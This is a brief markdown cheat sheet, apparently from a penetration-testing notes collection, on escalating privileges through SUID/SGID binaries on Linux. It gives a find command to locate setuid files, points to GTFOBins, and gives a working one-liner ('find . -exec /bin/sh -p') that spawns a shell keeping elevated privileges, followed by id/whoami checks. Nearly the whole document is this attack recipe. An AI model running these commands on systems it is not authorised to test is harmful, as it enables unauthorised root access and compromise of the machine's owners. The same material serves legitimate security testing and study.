# SUID / SGID Binaries

## Detection

find / -perm -4000 -type f 2>/dev/null

## Exploitation

Check binary on:

https://gtfobins.github.io

Example:

find . -exec /bin/sh -p \; -quit

## Verification

id
whoami
